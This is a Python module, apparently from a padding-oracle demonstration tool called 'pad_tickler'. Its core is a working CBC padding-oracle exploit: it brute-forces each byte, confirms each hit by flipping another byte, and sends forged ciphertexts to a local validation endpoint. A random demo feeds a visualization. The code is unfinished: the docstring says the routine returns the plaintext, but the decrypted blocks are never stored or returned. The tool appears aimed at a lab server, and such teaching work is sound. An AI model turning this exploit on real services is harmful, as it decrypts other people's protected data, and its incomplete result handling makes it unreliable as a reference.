import random
import time
from typing import Callable, Tuple

import requests

from pad_tickler.utils import b64_encode
from pad_tickler.state_snapshot import StateSnapshot
from pad_tickler.state_queue import SingleSlotQueue


SubmitFn = Callable[[bytes, bytes], bool]

MAX_POSSIBLE_STEPS = 0
CURRENT_STEP = 0
BYTES_FOUND = 0
BYTES_TOTAL = 0
COMPLETION_PERCENT = 0.00


def demo_producer(state_queue: SingleSlotQueue[StateSnapshot], blocks: int = 6, block_size: int = 16):
    # Generate random blocks for the initial demo state.
    ciphertext = [[random.randint(0, 255) for _ in range(block_size)] for _ in range(blocks)]
    ciphertext_prime = [[random.randint(0, 255) for _ in range(block_size)] for _ in range(blocks)]
    intermediate = [[None for _ in range(block_size)] for _ in range(blocks)]
    plaintext = [[None for _ in range(block_size)] for _ in range(blocks)]

    # Simulate the discovery process, updating the state values.
    state_version = 0
    for block_n in range(blocks):
        for byte_i in range(block_size - 1, -1, -1):
            time.sleep(0.03)  # ~33 FPS max
            state_version += 1

            # Update the value of the current byte in each block.
            ciphertext[block_n][byte_i] = random.randint(0, 255)
            ciphertext_prime[block_n][byte_i] = random.randint(0, 255)
            intermediate[block_n][byte_i] = random.randint(0, 255)
            plaintext[block_n][byte_i] = random.randint(0, 255)

            # Convert the blocks to tuples.
            plaintext_n_tuples = tuple(tuple(block) for block in plaintext)
            intermediate_n_tuple = tuple(tuple(block) for block in intermediate)
            ciphertext_n_tuple = tuple(tuple(block) for block in ciphertext)
            ciphertext_n_1_prime_tuple = tuple(tuple(block) for block in ciphertext_prime)

            # Create a new snapshot of the state.
            snapshot = StateSnapshot(
                state_version=state_version,
                block_count=len(plaintext),
                block_size=block_size,
                block_index_n=block_n,
                byte_index_i=byte_i,
                byte_value_g=random.randint(0, 255),
                pad_length_k=byte_i + 1,
                ciphertext=ciphertext_n_tuple,
                ciphertext_prime=ciphertext_n_1_prime_tuple,
                intermediate=intermediate_n_tuple,
                plaintext=plaintext_n_tuples,
            )

            state_queue.publish(snapshot)

    state_queue.close()


def _confirm_hit(submit: SubmitFn, cprev_prime: bytearray, ctarget: bytes, k: int) -> Tuple[bool, int]:
    """
    Flip a byte **outside** the last k bytes (i.e., index < 16 - k) and re-submit.
    If still valid, treat as a confirmed padding hit for this k.
    Returns (confirmed, flipped_index_or_-1).
    """
    bsz = len(ctarget)
    flip_idx = (bsz - k - 1)
    if flip_idx < 0:
        # No non-tail byte to flip (this happens at k == block_size). Accept as confirmed.
        return True, -1

    c2 = cprev_prime[:]
    c2[flip_idx] ^= 0x01
    ok2 = submit(bytes(c2), ctarget)
    return ok2, flip_idx


def solve_message(
    submit: SubmitFn,
    state_queue: SingleSlotQueue[StateSnapshot],
    iv: bytes,
    ciphertext: bytes,
    *,
    block_size: int = 16,
):
    """
    Solve all blocks of a CBC-encrypted message via a padding oracle.
    - iv: 16-byte IV (AES)
    - ciphertext: N*16 bytes
    Returns plaintext, intermediates per block, and per-block stats.
    """
    global CURRENT_STEP, MAX_POSSIBLE_STEPS, COMPLETION_PERCENT, BYTES_FOUND, BYTES_TOTAL

    assert len(iv) == block_size
    assert len(ciphertext) % block_size == 0, "ciphertext must be block-aligned"

    # Break the ciphertext into blocks.
    ciphertext_blocks = [ciphertext[i:i + block_size] for i in range(0, len(ciphertext), block_size)]
    block_count = len(ciphertext_blocks)

    # Initialize the intermediate and plaintext blocks.
    intermediate_blocks = [[None for _ in range(block_size)] for _ in range(block_count)]
    plaintext_blocks = [[None for _ in range(block_size)] for _ in range(block_count)]

    MAX_POSSIBLE_STEPS = 256 * 16 * block_count
    CURRENT_STEP = 0
    BYTES_FOUND = 0
    BYTES_TOTAL = len(ciphertext)

    state_version = 0

    for n, c_i in enumerate(ciphertext_blocks):

        # Create a new snapshot of the state.
        state_version += 1
        snapshot = StateSnapshot(
            state_version=state_version,
            block_count=block_count,
            block_size=block_size,
            block_index_n=n,
            byte_index_i=block_size - 1,  # Start from the last byte
            byte_value_g=0,
            pad_length_k=1,  # Start with padding length 1
            ciphertext=tuple(tuple(block) for block in ciphertext_blocks),
            ciphertext_prime=tuple(tuple(block) for block in ciphertext_blocks),
            intermediate=intermediate_blocks,
            plaintext=plaintext_blocks,
        )
        state_queue.publish(snapshot)

        #print(f"Solving block {n + 1}/{block_count}...")
        c_prev = iv if n == 0 else ciphertext_blocks[n - 1]

        #########################################################
        # Solve an individual block
        #res = solve_block(submit, block_count, n, c_prev, c_i, block_size=block_size)
        cprev_original = c_prev
        ctarget = c_i
        skip_trivial_original = True


        assert len(cprev_original) == block_size and len(ctarget) == block_size
        #stats = BlockStats()
        last = block_size - 1

        # Storage for intermediate bytes I_i (fill right->left)
        I = [None] * block_size  # type: ignore

        # We'll mutate a working copy of C_{i-1}
        cprev_prime = bytearray(cprev_original)

        # Optional: observe whether the original pair is valid (not used for logic)
        ok_orig = submit(cprev_original, ctarget)
        #stats.tries += 1
        # if ok_orig:
        #     #stats.positives += 1
        #     #stats.notes.append("original pair decrypts to valid PKCS#7")
        # else:
        #     #stats.negatives += 1

        # For k = 1..block_size
        for k in range(1, block_size + 1):
            # 1) Program the already-solved tail bytes to decrypt as k
            #    tail indices: [block_size - (k-1), ..., block_size-1]
            for j in range(block_size - (k - 1), block_size):
                i_byte = I[j]
                if i_byte is None:
                    # not solved yet (will happen only at start of each k)
                    continue
                cprev_prime[j] = i_byte ^ k

            # 2) Brute-force the new target byte at i = block_size - k
            i = block_size - k
            original_at_i = cprev_original[i]

            found = False
            for g in range(256):
                CURRENT_STEP += 1

                # Skip trivial original only for k==1 (classic optimization)
                if skip_trivial_original and k == 1 and g == original_at_i:
                    continue

                cprev_prime[i] = g
                ok = submit(bytes(cprev_prime), ctarget)
                #stats.tries += 1
                if not ok:
                    #stats.negatives += 1
                    #print(cprev_prime.hex(" "), f"\t{COMPLETION_PERCENT:.2f}% ({BYTES_FOUND}/{BYTES_TOTAL}) | n={n+1}/{block_count} | i={i} | k={k} | g={g:02x} | ok={ok}")
                    continue

                # Positive: confirm by flipping a non-tail byte
                confirmed, flip_idx = _confirm_hit(submit, cprev_prime, ctarget, k)
                #stats.tries += (0 if flip_idx == -1 else 1)  # _confirm_hit already counted internally
                if confirmed:
                    #stats.positives += 1 + (0 if flip_idx == -1 else 1)
                    #stats.confirmed_hits += 1
                    I[i] = g ^ k
                    found = True
                    BYTES_FOUND += 1
                    COMPLETION_PERCENT = BYTES_FOUND / BYTES_TOTAL * 100
                    #print(cprev_prime.hex(" "), f"\t{COMPLETION_PERCENT:.2f}% ({BYTES_FOUND}/{BYTES_TOTAL}) | n={n+1}/{block_count} | i={i} | k={k} | g={g:02x} | ok={ok} | confirmed={confirmed} | flip_idx={flip_idx}")
                    break
                else:
                    # Not confirmed -> likely false positive (e.g., collided with larger original padding)
                    #stats.positives += 1
                    #stats.negatives += 1
                    #print(cprev_prime.hex(" "), f"\t{COMPLETION_PERCENT:.2f}% ({BYTES_FOUND}/{BYTES_TOTAL}) | n={n+1}/{block_count} | i={i} | k={k} | g={g:02x} | ok={ok} | confirmed={confirmed} | flip_idx={flip_idx}")
                    continue

            if not found:
                raise RuntimeError(f"No valid guess found at k={k} (i={i}); oracle not behaving like pure PKCS#7?")

        # Build bytes
        i_block = bytes(x for x in I)  # type: ignore
        # Plaintext uses the **original** previous block (not the mutated one)
        p_block = bytes((i_block[b] ^ cprev_original[b]) for b in range(block_size))



        #########################################################
        # After individual block solving
        #print(f"Block {n + 1}/{block_count} solved: {res.stats.tries} requests, {res.stats.confirmed_hits} confirmed hits") if res.stats else print(f"Block {n + 1}/{block_count} solved: no stats") # type: ignore


def submit_http(prev_block: bytes, target_block: bytes) -> bool:
    ciphertext = prev_block + target_block
    ciphertext_b64 = b64_encode(ciphertext)
    payload = {
        "alg": "AES-128-CBC",
        "ciphertext_b64": ciphertext_b64
    }
    try:
        response = requests.post("http://127.0.0.1:8000/api/validate", json=payload, timeout=10)
        time.sleep(0.01)  # Small delay to prevent overwhelming the server
        return response.status_code == 200
    except Exception as e:
        print(f"Request failed: {e}")
        return False
